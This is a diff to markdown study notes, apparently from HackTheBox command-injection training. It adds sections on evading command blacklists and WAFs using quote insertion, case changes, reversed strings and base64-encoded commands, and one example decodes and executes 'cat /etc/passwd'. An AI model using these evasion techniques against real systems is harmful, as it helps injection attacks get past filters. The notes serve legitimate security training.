@@ -20,6 +20,19 @@
     - [Linux](#linux)
     - [Windows](#windows)
     - [Character Shifting](#character-shifting)
+  - [Bypassing Blacklisted Commands](#bypassing-blacklisted-commands)
+    - [Commands Blacklist](#commands-blacklist)
+    - [Linux \& Windows](#linux--windows)
+    - [Linux Only](#linux-only)
+    - [Windows Only](#windows-only)
+  - [Advanced Command Obfuscation](#advanced-command-obfuscation)
+    - [Case Manipulation](#case-manipulation)
+    - [Reversed Commands](#reversed-commands)
+      - [Linux](#linux-1)
+      - [Windows](#windows-1)
+    - [Encoded Commands](#encoded-commands)
+      - [Linux](#linux-2)
+      - [Windows](#windows-2)
 
 ---
 
@@ -263,3 +276,160 @@ d41y@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)
 
 \
 ```
+## Bypassing Blacklisted Commands
+
+### Commands Blacklist
+
+A basic command blacklist filter in PHP would look like this:
+
+```php
+$blacklist = ['whoami', 'cat', ...SNIP...];
+foreach ($blacklist as $word) {
+    if (strpos('$_POST['ip']', $word) !== false) {
+        echo "Invalid input";
+    }
+}
+```
+
+It is checking each word of the user input to see if it matches any of the blacklisted words. However, this code is looking for an exact match of the provided command, so if you send a slightly different command, it may not get blocked.
+
+### Linux & Windows
+
+One very common and easy obfuscation technique is inserting certain characters within your command that are usually ignored by command shells like Bash or Powershell and will execute the same command as if they were not there. Some are ```'``` or ```"```.
+
+```bash
+21y4d@htb[/htb]$ w'h'o'am'i
+
+21y4d
+
+...
+
+21y4d@htb[/htb]$ w"h"o"am"i
+
+21y4d
+```
+
+> [!CAUTION]
+> You cannot mix types of quotes and the number of qoutes must be even.
+
+### Linux Only
+
+There are some other Linux-only chars that you can use in the middle of commands, which the Bash shell will ignore. These are ```\``` and ```$@```. It works exactly as id did with the quotes, the number of chars do not have to be even.
+
+```bash
+who$@ami
+w\ho\am\i
+```
+
+### Windows Only
+
+There are also some Windows-only chars you can insert in the middle of commands that do not affect the outcome, like a ```^```.
+
+```powershell
+C:\htb> who^ami
+
+21y4d
+```
+
+## Advanced Command Obfuscation
+
+In some instances there are advanced filtering solutions, like WAF, and basic evasion techniques may not necessarily work.
+
+### Case Manipulation
+
+One command obfuscation technique is case manipulation, like inverting the character cases of a command or alternating between cases. This usually works because a command blacklist may not check for different case variations of a single word, as Linux systems are case-sensitive.
+
+```bash
+21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+
+21y4d
+```
+
+> [!NOTE]
+> This command uses ```tr``` to replace all upper-case chars with lower-case chars, which results in all lower-case chars command.
+
+In Microsoft, you can change the casing of the characters of the command and send it. Commands for Powershell are case-insensitive, meaning they will execute the command regardless of what case it is written in:
+
+```Powershell
+PS C:\htb> WhOaMi
+
+21y4d
+```
+
+### Reversed Commands
+
+#### Linux
+
+Another command obfuscation technique is reversing commands and having a command template that switches them back and executes them in real-time.
+
+```bash
+d41y@htb[/htb]$ echo 'whoami' | rev
+imaohw
+```
+
+Then, you can execute the original command by reversing it back in a sub-shell ```$()```:
+
+```bash
+21y4d@htb[/htb]$ $(rev<<<'imaohw')
+
+21y4d
+```
+
+#### Windows
+
+The same can applied in Windows.
+
+```powershell
+PS C:\htb> "whoami"[-1..-20] -join ''
+
+imaohw
+```
+
+Powershell sub-shell:
+
+```powershell
+PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"
+
+21y4d
+```
+
+### Encoded Commands
+
+... are helpful for commands containing filtered characters or characters that may be URL-decoded by the server. This may allow for the command to get messed up by the time it reaches the shell and eventually fails to execute. Instead of copying an existing command online, you will try to create your own unique obfuscation command this time. This way, it is much less likely to be denied by a filter or a WAF. The command you create will be unique to each case, depending on what chars are allowed and the level of security of the server.
+
+#### Linux
+
+You can utilize various encoding tools, like ```base64``` or ```xxd```.
+
+```bash
+d41y@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64
+
+Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
+```
+
+Now you can create a command that will decode the encoded string in a sub-shell, and then pass it to Bash to be executed.
+
+```bash
+d41y@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+```
+
+#### Windows
+
+You can use the same technique with Windows as well:
+
+```powershell
+PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+
+dwBoAG8AYQBtAGkA
+```
+
+And:
+
+```powershell
+PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+
+21y4d
+```
+
